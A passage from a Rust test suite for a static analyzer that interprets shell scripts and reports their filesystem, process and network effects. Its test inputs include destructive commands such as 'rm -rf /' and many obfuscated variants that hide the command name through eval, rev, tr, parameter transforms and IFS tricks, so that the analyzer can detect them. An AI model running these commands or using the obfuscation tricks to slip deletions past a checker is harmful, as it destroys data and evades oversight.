            plan.boundaries[0].domains.len(),
            effinterp_proto::DOMAINS.len() + 1,
            "{source}"
        );
    }
}

#[test]
fn symbolic_wrapper_conditions_compose_and_keep_head_spans_distinct() {
    let plan = shell(
        r#"if [ -f marker ]; then $SUDO sh -c "rm -rf /x"; fi; "$DOCKER" rm -f /y"#,
        None,
    );
    let condition = |path: &str| {
        plan.effects
            .iter()
            .find(|effect| {
                effect.operation.0 == "filesystem.delete"
                    && matches!(&effect.resource,
                        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: deleted } }
                            if deleted == path)
            })
            .and_then(|effect| effect.condition.as_ref())
            .map(|condition| condition.atoms().into_iter().map(|a| a.origin.kind).collect::<Vec<_>>())
            .unwrap()
    };

    let nested = condition("/x");
    let direct = condition("/y");
    assert!(nested.contains(&effinterp_proto::ConditionKind::Branch));
    assert!(nested.contains(&effinterp_proto::ConditionKind::UnresolvedExecution));
    assert!(direct.contains(&effinterp_proto::ConditionKind::UnresolvedExecution));
    assert!(!direct.contains(&effinterp_proto::ConditionKind::Branch));
    assert_ne!(nested, direct);
}

#[test]
fn declaration_operands_bind_from_entry_snapshot() {
    for source in [
        r#"A=rm; declare A=echo B=$A; "$B" -rf /"#,
        r#"A=rm; B=x; declare A=echo B=$A C=$B; "$B" -rf /; rm "/$C""#,
        r#"A=rm; declare B=$A; "$B" -rf /"#,
        r#"A=rm; typeset A=echo B=$A; "$B" -rf /"#,
        r#"A=rm; readonly A=echo B=$A; "$B" -rf /"#,
        r#"A=rm; f(){ local A=echo B=$A; "$B" -rf /; }; f"#,
        r#"A=rm; declare A=echo B=($A -rf /); "${B[@]}""#,
    ] {
        let plan = shell(source, None);
        assert_eq!(exec_argv(&plan, "rm"), ["rm", "-rf", "/"], "{source}");
        assert!(delete_resources(&plan).iter().any(|resource| matches!(
            resource,
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/"
        )), "{source}");
        if source.contains("C=$B") {
            assert!(delete_resources(&plan).iter().any(|resource| matches!(
                resource,
                ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/x"
            )));
        }
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
    }
}

#[test]
fn local_bindings_are_restored_on_return() {
    for source in [
        r#"TOOL=rm; f(){ local TOOL=echo; }; f; "$TOOL" -rf /"#,
        r#"TOOL=rm; f(){ local TOOL; TOOL=echo; }; f; "$TOOL" -rf /"#,
        r#"TOOL=rm; f(){ local TOOL=echo; local TOOL=:; }; f; "$TOOL" -rf /"#,
        r#"TOOL=rm; f(){ local TOOL=echo; }; if f; then :; fi; "$TOOL" -rf /"#,
        r#"TOOL=rm; g(){ local TOOL=:; }; f(){ local TOOL=echo; g; "$TOOL" -rf /; }; f; "$TOOL" -rf /"#,
        r#"TOOL=(rm -rf /); f(){ local TOOL=(echo); }; f; "${TOOL[@]}""#,
    ] {
        let plan = shell(source, None);
        assert_eq!(exec_argv(&plan, "rm"), ["rm", "-rf", "/"], "{source}");
        assert_eq!(delete_resources(&plan).len(), 1, "{source}");
        assert!(matches!(
            delete_resources(&plan)[0],
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/"
        ));
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
    }
    let plan = shell(
        r#"TOOL=echo; f(){ local TOOL=rm; }; f; "$TOOL" -rf /"#,
        None,
    );
    assert!(delete_resources(&plan).is_empty());
    assert!(plan.boundaries.is_empty());

    let plan = shell(r#"f(){ local TOOL=echo; }; f; "$TOOL" -rf /"#, None);
    assert!(env_reads(&plan).contains(&"TOOL"));
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unresolved_command")
    );

    let plan = shell(
        r#"TOOL=rm; f(){ local TOOL=echo; "$TOOL" -rf /; }; f"#,
        None,
    );
    assert!(plan.effects.is_empty());
}

#[test]
fn assign_default_binds_the_variable() {
    for source in [
        r#"unset target; value="${target:=/}"; rm -rf "$target""#,
        r#"unset tool; "${tool:=rm}" -rf /"#,
        r#"unset x; rm -rf "${x=/}""#,
        r#"unset x; eval "${x:=rm -rf /}""#,
        r#"unset tool; : "${tool:=rm}"; "$tool" -rf /"#,
        r#"unset tool; : "${tool=rm}"; "$tool" -rf /"#,
    ] {
        let plan = shell(source, None);
        assert_eq!(exec_argv(&plan, "rm"), ["rm", "-rf", "/"], "{source}");
        assert!(delete_resources(&plan).iter().any(|resource| matches!(
            resource,
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/"
        )), "{source}");
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
        if source.contains("eval") {
            assert!(ops(&plan).contains(&"process.code_execution"));
        }
    }
    let plan = shell(
        r#"unset target; : > "${target:=/tmp/output}"; rm "$target""#,
        None,
    );
    assert!(plan.effects.iter().any(|effect| effect.operation.0 == "filesystem.write"
        && matches!(&effect.resource,
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/tmp/output")));
    assert_eq!(exec_argv(&plan, "rm"), ["rm", "/tmp/output"]);
    assert!(plan.boundaries.is_empty());

    let plan = shell(
        r#"unset tool; f(){ tool=echo; : "$1"; }; f "${tool:=rm}"; "$tool" -rf /"#,
        None,
    );
    assert!(delete_resources(&plan).is_empty());
    assert!(plan.boundaries.is_empty());

    let plan = shell(r#"x=:; eval "${x:=rm -rf /}""#, None);
    assert!(ops(&plan).contains(&"process.code_execution"));
    assert!(delete_resources(&plan).is_empty());
    assert!(plan.boundaries.is_empty());
}

#[test]
fn script_set_parameter_defaults_resolve_before_field_splitting() {
    for (source, executable) in [
        (
            "unset TARGET; echo {${TARGET:=/x},/y}; rm -rf $TARGET",
            "rm",
        ),
        ("unset SUDO; ${SUDO:-} rm -rf /x", "rm"),
        ("unset SUDO; ${SUDO:=sudo} rm -rf /x", "sudo"),
        ("SUDO=doas; ${SUDO:-sudo} rm -rf /x", "doas"),
        ("SUDO=; ${SUDO:-sudo} rm -rf /x", "sudo"),
        ("SUDO=; ${SUDO-sudo} rm -rf /x", "rm"),
    ] {
        let plan = shell(source, None);
        assert_eq!(exec_argv(&plan, executable)[0], executable, "{source}");
        assert!(delete_resources(&plan).iter().any(|resource| {
            matches!(resource,
                ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                    if path == "/x")
        }));
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
    }
}

#[test]
fn exact_parameter_transforms_nested_defaults_and_arithmetic_feed_eval() {
    for source in [
        r#"unset CODE; FALLBACK='rm -rf /'; eval "${CODE:-${FALLBACK}}""#,
        r#"CODE='rm xx-rf /'; eval "${CODE/xx/}""#,
        r#"x=1; eval "echo $((x+1)); rm -rf /""#,
        r#"CODE='rm -rf /x'; eval "${CODE%x}""#,
        r#"CODE='RM -RF /'; eval "${CODE,,}""#,
        r#"CODE='Rm -rf /'; eval "${CODE,}""#,
        r#"CODE='rM -rf /'; eval "${CODE,,M}""#,
        r#"CODE='rm -rf /'; eval "${CODE^^/}""#,
    ] {
        let plan = shell(source, None);
        assert!(delete_resources(&plan).iter().any(|resource| matches!(
            resource,
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/"
        )), "{source}: {:?}", plan.effects);
    }

    for source in [
        r#"eval "${AMBIENT%x}""#,
        r#"eval "${AMBIENT:-${FALLBACK}}""#,
        r#"eval "rm -rf /$((AMBIENT+1))""#,
        r#"eval "${AMBIENT,,}""#,
        // Exact values: only the first character is uppercased, and a
        // pattern tests one character at a time.
        r#"CODE='rm -rf /'; eval "${CODE^}""#,
        r#"CODE='RM -RF /'; eval "${CODE,,RM}""#,
        // Case mapping beyond ASCII depends on the locale.
        r#"CODE='rm -rf /É'; eval "${CODE,,}""#,
    ] {
        let plan = shell(source, None);
        assert!(delete_resources(&plan).iter().all(|resource| !matches!(
            resource,
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/"
        )), "{source}: {:?}", plan.effects);
        assert!(!plan.boundaries.is_empty(), "{source}");
    }
}

#[test]
fn exact_function_stdout_can_resolve_a_traversing_operand() {
    let plan = shell(
        "path(){ printf ../../../../../../etc; }; rm -rf safe/$(path)",
        Some("/workspace/project"),
    );
    assert!(delete_resources(&plan).iter().any(|resource| matches!(
        resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/etc"
    )));

    let conditional = shell(
        "path(){ if true; then printf ../../../../../../etc; fi; }; rm -rf safe/$(path)",
        Some("/workspace/project"),
    );
    assert!(delete_resources(&conditional).iter().all(|resource| !matches!(
        resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/etc"
    )));
}

#[test]
fn unquoted_variable_expansion_splits_fields() {
    let plan = shell(r#"args="-r -f"; rm $args /tmp/z"#, None);
    assert_eq!(exec_argv(&plan, "rm"), ["rm", "-r", "-f", "/tmp/z"]);
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert_eq!(delete.attributes.get("force"), Some(&AttrValue::Bool(true)));
    assert_eq!(
        delete.attributes.get("recursive"),
        Some(&AttrValue::Bool(true))
    );

    let quoted = shell(r#"x="a b"; rm "$x""#, None);
    assert_eq!(exec_argv(&quoted, "rm"), ["rm", "a b"]);
    assert_eq!(delete_resources(&quoted).len(), 1);

    let unquoted = shell(r#"x="a b"; rm $x"#, None);
    assert_eq!(exec_argv(&unquoted, "rm"), ["rm", "a", "b"]);
    assert_eq!(delete_resources(&unquoted).len(), 2);

    for (source, expected) in [
        (r#"set -- 'a b'; rm $1"#, vec!["rm", "a", "b"]),
        (r#"set -- 'a b'; rm "$1""#, vec!["rm", "a b"]),
        (r#"set -- ''; rm $1 /tmp/z"#, vec!["rm", "/tmp/z"]),
        (r#"set -- ''; rm "$1" /tmp/z"#, vec!["rm", "", "/tmp/z"]),
    ] {
        assert_eq!(exec_argv(&shell(source, None), "rm"), expected, "{source}");
    }
}

#[test]
fn unquoted_variable_expansion_supplies_the_command_head() {
    let plan = shell(r#"x="rm  -rf   /tmp/y "; $x"#, None);
    assert_eq!(exec_argv(&plan, "rm"), ["rm", "-rf", "/tmp/y"]);
    assert!(plan.boundaries.is_empty(), "{:?}", plan.boundaries);
    assert!(matches!(
        delete_resources(&plan).as_slice(),
        [ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path }
        }] if path == "/tmp/y"
    ));

    let plan = shell(
        r#"sh_c='sudo -E sh -c'; $sh_c "apt-get install -y docker""#,
        None,
    );
    let executables = plan
        .execution_graph
        .nodes
        .iter()
        .filter_map(|node| match &node.subject {
            Subject::Exec { argv, .. } => argv.first().map(String::as_str),
            _ => None,
        })
        .collect::<Vec<_>>();
    assert!(executables.starts_with(&["sudo", "sh", "apt-get"]));
    assert_eq!(
        exec_argv(&plan, "sudo"),
        ["sudo", "-E", "sh", "-c", "apt-get install -y docker"]
    );
    assert!(ops(&plan).contains(&"network.download"));
}

#[test]
fn empty_unquoted_variable_fields_are_elided() {
    for source in [
        "set -- ''; rm $@ /x",
        "set -- ''; rm $* /x",
        "arr=(''); rm ${arr[@]} /x",
        "arr=(''); rm ${arr[*]} /x",
    ] {
        let plan = shell(source, None);
        assert_eq!(exec_argv(&plan, "rm"), ["rm", "/x"]);
        assert!(plan.boundaries.is_empty(), "{source}");
    }
    for source in [r#"set -- ''; rm "$@" /x"#, r#"arr=(''); rm "${arr[@]}" /x"#] {
        let plan = shell(source, None);
        assert_eq!(exec_argv(&plan, "rm"), ["rm", "", "/x"]);
    }

    let plan = shell("EMPTY=; $EMPTY", None);
    assert!(plan.effects.is_empty());
    assert!(plan.boundaries.is_empty());

    let plan = shell("SUDO=; $SUDO rm -rf /x", None);
    assert_eq!(exec_argv(&plan, "rm"), ["rm", "-rf", "/x"]);

    let plan = shell("P=; $P cd /srv; rm -rf data", None);
    assert!(matches!(
        delete_resources(&plan).as_slice(),
        [ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path }
        }] if path == "/srv/data"
    ));

    let plan = shell("W=; W2=; $W $W2 rm -rf /x", None);
    assert_eq!(exec_argv(&plan, "rm"), ["rm", "-rf", "/x"]);

    let plan = shell(
        r#"E=; a=(cd /srv); if true; then a=(rm -rf /x); fi; $E "${a[@]}""#,
        None,
    );
    assert_eq!(exec_argv(&plan, "rm"), ["rm", "-rf", "/x"]);
    assert!(matches!(
        delete_resources(&plan).as_slice(),
        [ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path }
        }] if path == "/x"
    ));
}

#[test]
fn empty_argv_variant_does_not_hide_nonempty_alternative() {
    for source in [
        r#"E=; a=(); if true; then a=(rm -rf /x); fi; $E "${a[@]}""#,
        r#"a=(); if true; then a=(rm -rf /x); fi; "${a[@]}""#,
    ] {
        let plan = shell(source, None);
        assert_eq!(exec_argv(&plan, "rm"), ["rm", "-rf", "/x"]);
        assert!(matches!(
            delete_resources(&plan).as_slice(),
            [ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            }] if path == "/x"
        ));
    }
}

#[test]
fn elided_command_head_uses_definite_converted_name() {
    for source in [
        r#"E=; C=cd; $E "$C" /srv; rm -rf data"#,
        r#"E=; C=c; $E ${C}d /srv; rm -rf data"#,
    ] {
        let plan = shell(source, None);
        assert!(matches!(
            delete_resources(&plan).as_slice(),
            [ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            }] if path == "/srv/data"
        ));
    }
}

#[test]
fn unquoted_variable_unions_split_each_argv_alternative() {
    for source in [
        r#"mocha="bunx mocha"; $mocha t.js"#,
        r#"if test -e marker; then mocha="bunx mocha"; else mocha="npx mocha"; fi; $mocha t.js"#,
        r#"for mocha in 'bunx mocha' 'npx mocha'; do $mocha t.js; done"#,
    ] {
        let plan = shell(source, None);
        assert_eq!(exec_argv(&plan, "bunx"), ["bunx", "mocha", "t.js"]);
        if !source.starts_with("mocha=") {
            assert_eq!(exec_argv(&plan, "npx"), ["npx", "mocha", "t.js"]);
        }
        let executables: Vec<_> = plan
            .effects
            .iter()
            .filter_map(|effect| match &effect.resource {
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::Process { executable, .. },
                } if effect.operation.0 == "process.exec" => Some(executable.as_str()),
                _ => None,
            })
            .collect();
        assert!(executables.contains(&"bunx"));
        if !source.starts_with("mocha=") {
            assert!(executables.contains(&"npx"));
        }
        assert!(executables.iter().all(|name| !name.contains(' ')));
        assert!(!plan.boundaries.iter().any(|boundary| {
            boundary.reason.as_str() == "unmodeled_command"
                && boundary.detail.as_deref().is_some_and(|detail| {
                    detail.contains("bunx mocha") || detail.contains("npx mocha")
                })
        }));
    }
    for source in [
        r#"for m in "rm -rf" echo; do $m /tmp/x; done"#,
        r#"if test -e marker; then m="rm -rf"; else m="echo"; fi; $m /tmp/x"#,
        r#"if test -e marker; then m="rm -rf"; else m=":"; fi; $m /tmp/x"#,
        r#"if test -e marker; then m="echo hi"; else m="rm"; fi; $m /tmp/x"#,
        r#"if test -e marker; then m="cd /tmp"; else m="rm -rf"; fi; $m /tmp/x"#,
        r#"if test -e marker; then m="trap :"; else m="rm -rf"; fi; $m /tmp/x"#,
        r#"if test -e marker; then m="exec rm -rf"; else m="echo"; fi; $m /tmp/x"#,
        r#"if test -e marker; then m="command rm -rf"; else m="echo"; fi; $m /tmp/x"#,
        r#"f() { rm "$1"; }; if test -e marker; then m="f /tmp/x"; else m="echo"; fi; $m"#,
    ] {
        let plan = shell(source, None);
        assert!(
            exec_argv(&plan, "rm").iter().any(|arg| arg == "/tmp/x"),
            "{source}"
        );
        assert!(!delete_resources(&plan).is_empty(), "{source}");
        assert!(
            plan.effects.iter().all(|effect| {
                !matches!(&effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::Process { executable, .. },
                } if executable == "echo" || executable == ":" || executable == "cd"
                    || executable == "trap" || executable == "exec" || executable == "command"
                    || executable == "f")
            }),
            "{source}"
        );
    }
    let plan = shell(
        r#"if test -e marker; then m="${M:-bunx mocha}"; else m="npx mocha"; fi; $m t.js"#,
        None,
    );
    assert_eq!(exec_argv(&plan, "bunx"), ["bunx", "mocha", "t.js"]);
    assert_eq!(exec_argv(&plan, "npx"), ["npx", "mocha", "t.js"]);
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unresolved_command")
    );
    let plan = shell(
        r#"if test -e marker; then mocha="bunx mocha"; else mocha="npx mocha"; fi; "$mocha" t.js"#,
        None,
    );
    for head in ["bunx mocha", "npx mocha"] {
        assert_eq!(exec_argv(&plan, head), [head, "t.js"]);
    }
    for (values, expected) in [
        (
            r#"flags="-a -b"; else flags="-c""#,
            vec![vec!["tool", "-a", "-b", "tail"], vec!["tool", "-c", "tail"]],
        ),
        (
            r#"flags=""; else flags="-c""#,
            vec![vec!["tool", "tail"], vec!["tool", "-c", "tail"]],
        ),
    ] {
        let plan = shell(
            &format!("if test -e marker; then {values}; fi; tool $flags tail"),
            None,
        );
        let mut argv: Vec<_> = plan
            .execution_graph
            .nodes
            .iter()
            .filter_map(|node| match &node.subject {
                Subject::Exec { argv, .. } if argv.first().is_some_and(|head| head == "tool") => {
                    Some(argv.iter().map(String::as_str).collect::<Vec<_>>())
                }
                _ => None,
            })
            .collect();
        argv.sort();
        let mut expected = expected;
        expected.sort();
        assert_eq!(argv, expected);
    }
    let plan = shell(
        r#"if test -e marker; then cmd="bunx mocha"; else cmd="npx"; fi; $cmd t.js"#,
        None,
    );
    assert_eq!(exec_argv(&plan, "bunx"), ["bunx", "mocha", "t.js"]);
    assert_eq!(exec_argv(&plan, "npx"), ["npx", "t.js"]);
}

#[test]
fn known_custom_ifs_splits_command_head() {
    let plan = shell(
        r#"IFS=:; if true; then cmd="bunx mocha"; else cmd="npx mocha"; fi; $cmd t.js"#,
        None,
    );
    assert_eq!(exec_argv(&plan, "bunx mocha"), ["bunx mocha", "t.js"]);
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|boundary| { boundary.reason.as_str() == "unsupported_shell_syntax" })
    );

    let plan = shell(r#"IFS=:; x="a:b"; rm $x"#, None);
    assert_eq!(exec_argv(&plan, "rm"), ["rm", "a:b"]);
    assert!(plan.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "unsupported_shell_syntax"
            && boundary.class == BoundaryClass::Unsupported
    }));

    let plan = shell(r#"x="a b"; rm $x; IFS=,; rm $x"#, None);
    let rm_argv = plan
        .execution_graph
        .nodes
        .iter()
        .filter_map(|node| match &node.subject {
            Subject::Exec { argv, .. } if argv.first().is_some_and(|head| head == "rm") => {
                Some(argv.as_slice())
            }
            _ => None,
        })
        .collect::<Vec<_>>();
    assert_eq!(rm_argv, [&["rm", "a", "b"][..], &["rm", "a b"][..]]);
    assert_eq!(
        plan.boundaries
            .iter()
            .filter(|boundary| boundary.reason.as_str() == "unsupported_shell_syntax")
            .count(),
        1
    );

    let plan = shell(r#"if condition; then IFS=:; fi; x="a:b c"; rm $x"#, None);
    assert_eq!(exec_argv(&plan, "rm"), ["rm", "a:b c"]);
    assert!(plan.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "unsupported_shell_syntax"
            && boundary.class == BoundaryClass::Unsupported
    }));

    let plan = shell(r#"IFS=:; TOOL='rm:-rf:/victim'; $TOOL"#, None);
    assert!(has_delete(&plan, "/victim"));
    let execution = plan
        .effects
        .iter()
        .find(|effect| {
            effect.operation.0 == "process.code_execution"
                && effect.attributes.get("derivation")
                    == Some(&AttrValue::String("unresolved_command".into()))
        })
        .unwrap();
    assert_eq!(
        execution.request_assurance,
        effinterp_proto::RequestAssurance::Exact
    );
    assert_eq!(
        execution.attributes.get("derivation"),
        Some(&AttrValue::String("unresolved_command".into()))
    );
}

fn computed_head(plan: &Plan) -> bool {
    plan.effects.iter().any(|effect| {
        effect.operation.0 == "process.code_execution"
            && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
            && effect.attributes.get("derivation")
                == Some(&AttrValue::String("unresolved_command".into()))
    })
}

#[test]
fn readonly_option_rejection_is_bash_only() {
    // bash's `readonly` rejects any option but -a/-A/-f/-p and binds nothing,
    // so an established-bash script keeps the earlier value.
    let plan = shell(
        r#"TOOL=echo; readonly -l TOOL=RM; "$TOOL" -rf /victim"#,
        None,
    );
    assert!(!has_delete(&plan, "/victim"), "{:?}", plan.effects);
    // bash still blocks the deletion its `readonly -i` never suppresses.
    let plan = shell(r#"X=/victim; readonly -i X=1; rm -rf "$X""#, None);
    assert!(has_delete(&plan, "/victim"));
    // zsh accepts the attribute options, so the assignment (and its modeled
    // transform) stays visible and the computed head is not lost.
    let plan = shell(
        r#"zsh -c 'TOOL=echo; readonly -l TOOL=RM; "$TOOL" -rf /victim'"#,
        None,
    );
    assert!(has_delete(&plan, "/victim"), "{:?}", plan.effects);
    assert!(computed_head(&plan));
    let plan = shell(
        r#"zsh -c 'readonly -i TOOL=1+1; "$TOOL" -rf /victim'"#,
        None,
    );
    assert!(computed_head(&plan));
    // dash and sh reject the option too, so they invent no assignment and no
    // deletion; the earlier `echo` value stands.
    for shell_program in ["dash", "sh"] {
        let plan = shell(
            &format!(r#"{shell_program} -c 'TOOL=echo; readonly -l TOOL=RM; "$TOOL" -rf /victim'"#),
            None,
        );
        assert!(
            !has_delete(&plan, "/victim"),
            "{shell_program}: {:?}",
            plan.effects
        );
    }
}

#[test]
fn eval_transform_marks_program_positions_but_not_data_arguments() {
    // The transform supplies the program name or shell structure: the
    // computed-program fact is kept and the invocation blocks.
    for source in [
        // Transform at the command head.
        r#"eval "$(rev <<< mr)" -rf /victim"#,
        // Redirection before the transform shifts the head onto it.
        r#"eval "</dev/null" "$(rev <<< mr)" -rf /victim"#,
        r#"eval "X=1 </dev/null" "$(rev <<< mr)" /victim"#,
        // A non-literal first word can vanish or split, exposing the transform.
        r#"EMPTY=; eval "$EMPTY" "$(rev <<< mr)" /victim"#,
        r#"IFS=' '; DROP=' '; eval "$DROP" "$(rev <<< mr)" /victim"#,
        // Dispatcher and reserved-word heads leave the program undetermined.
        r#"eval command "$(rev <<< mr)" /victim"#,
        r#"eval "time -p" "$(rev <<< mr)" /victim"#,
        // Alias expansion can remove or change the head word.
        r#"shopt -s expand_aliases; alias pre=''; eval pre "$(rev <<< mr)" /victim"#,
        // A real unquoted separator introduces another command.
        r#"eval echo "$(rev <<< '/ ; mr')""#,
        // A transformed argument that itself carries a command, backtick, or
        // process substitution supplies execution, not data.
        r#"eval echo "$(rev <<< ')olleh ohce($')""#,
        r#"eval echo "$(rev <<< '`olleh ohce`')""#,
        r#"eval echo "$(rev <<< ')olleh ohce(<')""#,
        // A non-data-sink head (function, executable path, interpreter, or any
        // arbitrary program) is not proven to consume the transform as data.
        r#"run(){ "$@"; }; eval run "$(rev <<< ohce)" hello"#,
        r#"eval /usr/bin/env "$(rev <<< ohce)" hello"#,
        r#"eval bash -c "$(rev <<< "'olleh ohce'")""#,
        r#"eval rm "$(rev <<< mitciv/)""#,
        // `printf -v` evaluates an arithmetic subscript in its destination
        // name, so a command substitution inside a quoted name still runs.
        r#"eval printf -v "$(rev <<< "'])0 ftnirp ;dliub/. fr- mr($[a'")" value"#,
        // Arithmetic expansion evaluates a nested command substitution.
        r#"eval echo "$(rev <<< ')) 1 + )1 ftnirp ;dliub/. fr- mr($ (($')""#,
    ] {
        assert!(
            computed_head(&shell(source, None)),
            "{source} should keep the hidden-program fact"
        );
    }
    // The transform supplies only a data argument after a clean literal head:
    // no computed-program fact. Quoted punctuation in the argument is data.
    for source in [
        r#"eval echo "$(rev <<< olleh)""#,
        r#"eval "echo" "$(tr a-z A-Z <<< hello)""#,
        r#"eval echo "$(rev <<< 'olleh dlrow')""#,
        r#"eval echo "$(rev <<< "';olleh'")""#,
    ] {
        assert!(
            !computed_head(&shell(source, None)),
            "{source} should not be obfuscated"
        );
    }
}

#[test]
fn transformed_command_heads_resolve_without_marking_plain_quoted_variables() {
    for source in [
        r#"TOOL=rmx; "${TOOL%x}" -rf /victim"#,
        r#"TOOL=xrm; "${TOOL#x}" -rf /victim"#,
        r#"TOOL=rXm; "${TOOL/X/}" -rf /victim"#,
        r#"TOOL=RM; "${TOOL,,}" -rf /victim"#,
        r#"TOOL=rmdir; "${TOOL:0:2}" -rf /victim"#,
        r#"TOOL=xrm; ${TOOL:1} -rf /victim"#,
        r#"A=rm; R=A; "${!R}" -rf /victim"#,
        r#"$(rev <<< mr) -rf /victim"#,
        r#"`rev <<< mr` -rf /victim"#,
        r#"rm${IFS}-rf${IFS}/victim"#,
        // A negative substring length counts back from the end.
        r#"X=rmx; "${X:0:-1}" -rf /victim"#,
        // A leading-zero substring operand is octal, and 00 is 0.
        r#"TOOL=rmdir; "${TOOL:00:2}" -rf /victim"#,
        // A captured substitution held in a variable, then run unquoted.
        r#"X=$(rev <<< mr); $X -rf /victim"#,
        // A word joined by a custom IFS splits on that IFS.
        r#"IFS=,; rm${IFS}-rf${IFS}/victim"#,
        // A declared case attribute rewrites the assigned value.
        r#"declare -l TOOL=RM; "$TOOL" -rf /victim"#,
        // `eval` of a translated literal runs code the source never spells.
        r#"eval "$(tr a-z n-za-m <<< 'ez -es /ivpgvz')""#,
        // Unseen eval code may have rebound the variable.
        r#"TOOL=rm; eval "$(cat unobserved)"; "$TOOL" -rf /victim"#,
    ] {
        let plan = shell(source, None);
        assert!(has_delete(&plan, "/victim"), "{source}: {:?}", plan.effects);
        assert!(computed_head(&plan), "{source}");
    }
    // `declare -i` stores the arithmetic result, not the expression.
    let plan = shell(r#"declare -i TOOL=1+1; "$TOOL" -rf /victim"#, None);
    assert!(computed_head(&plan));
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "process.exec"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::Process { executable, .. },
            } if executable == "2")
    }));
    // A variable's contents are arithmetic: octal stays unknown rather than
    // decimal, and each operand sees the operands bound before it.
    let plan = shell(r#"N=010; declare -i X=N; rm -rf "/victim$X""#, None);
    assert!(!has_delete(&plan, "/victim10"));
    let plan = shell(r#"N=5; declare -i N=1 X=N; rm -rf "/victim$X""#, None);
    assert!(has_delete(&plan, "/victim1"));
    // An unrecovered substitution still names the program.
    let plan = shell(r#"$(which python3) -m pip install x"#, None);
    assert!(computed_head(&plan));

    for source in [
        r#"TOOL=rm; "$TOOL" -rf /victim"#,
        r#"declare -l TOOL=rm; "$TOOL" -rf /victim"#,
        r#"eval "$(printf 'rm -rf /victim')""#,
        // Unseen eval code cannot rebind a readonly name.
        r#"readonly TOOL=rm; eval "$(cat unobserved)"; "$TOOL" /victim"#,
        // bash rejects `readonly -i`, which then binds nothing.
        r#"X=/victim; readonly -i X=1; rm -rf "$X""#,
    ] {
        let plan = shell(source, None);
        assert!(has_delete(&plan, "/victim"), "{source}");
        assert!(!computed_head(&plan), "{source}");
    }
    let plan = shell(r#"TOOL=rm; "$TOOL" -rf /victim"#, None);
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "process.code_execution")
    );
}

#[test]
fn transparent_literal_output_substitutions_are_not_obfuscated() {
    // echo/printf/cat pass a source-visible literal through unchanged, so a
    // program name from them is resolved with ordinary effects and no
    // obfuscation fact, whether direct or held in a variable.
    for source in [
        r#"$(echo rm) /victim"#,
        r#"X=$(echo rm); $X /victim"#,
        r#"$(printf rm) /victim"#,
        r#"X=$(cat <<< rm); $X /victim"#,
    ] {
        let plan = shell(source, None);
        assert!(has_delete(&plan, "/victim"), "{source}: {:?}", plan.effects);
        assert!(!computed_head(&plan), "{source} should not be obfuscated");
    }
    // A concealing producer stays marked, whether or not its output is
    // recovered (`tr`, `which`, `command -v` are not, so they carry no resolved
    // delete) and whether reached directly or captured into a variable head.
    // The exemption is only for a source-visible literal: a `cat` of a file,
    // an `echo`/`printf` of a nested substitution, and a multi-stage pipeline
    // all hide the printed name and stay marked.
    for source in [
        r#"$(rev <<< mr) /victim"#,
        r#"X=$(rev <<< mr); $X /victim"#,
        r#"$(echo qm | tr q r) /victim"#,
        r#"X=$(echo qm | tr q r); $X /victim"#,
        r#"X=$(which rm); $X /victim"#,
        r#"X=$(command -v rm); $X /victim"#,
        r#"$(cat tool-name) /victim"#,
        r#"X=$(cat tool-name); $X /victim"#,
        r#"$(cat < tool-name) /victim"#,
        r#"$(echo "$(which rm)") /victim"#,
        r#"$(echo rm | cat) /victim"#,
        // A heredoc that can expand hides a name obtained by a nested lookup.
        "$(cat <<EOF\n$(which rm)\nEOF\n) /victim",
        // An unquoted producer output that would field/pathname/brace-expand is
        // not a proven single literal head.
        r#"$(printf "%s" {r,m}) /victim"#,
        r#"$(echo 'r*') /victim"#,
    ] {
        assert!(
            computed_head(&shell(source, None)),
            "{source} should be obfuscated"
        );
    }
    // A proven-literal heredoc body (quoted delimiter or no expansion) is
    // source-visible: its output is recovered so the head keeps its effect
    // without an obfuscation fact, the same as a here-string.
    for source in [
        "$(cat <<EOF\nrm\nEOF\n) /victim",
        "$(cat <<'E'\nrm\nE\n) /victim",
    ] {
        let plan = shell(source, None);
        assert!(!computed_head(&plan), "{source} should not be obfuscated");
        assert!(
            has_delete(&plan, "/victim"),
            "{source} should recover the deletion: {:?}",
            plan.effects
        );
    }
    // An escaped `\$` in an expanding heredoc is literal source text, not a
    // nested substitution, so the captured head is recovered without an
    // obfuscation fact (the unescaped form above stays marked). A quoted
    // command-substitution head is one word no expansion can split, so a
    // finite brace in its producer (`{l,s}`) expands there as in any command
    // and stays source-visible, unlike the unquoted `{r,m}` form marked above.
    for source in [
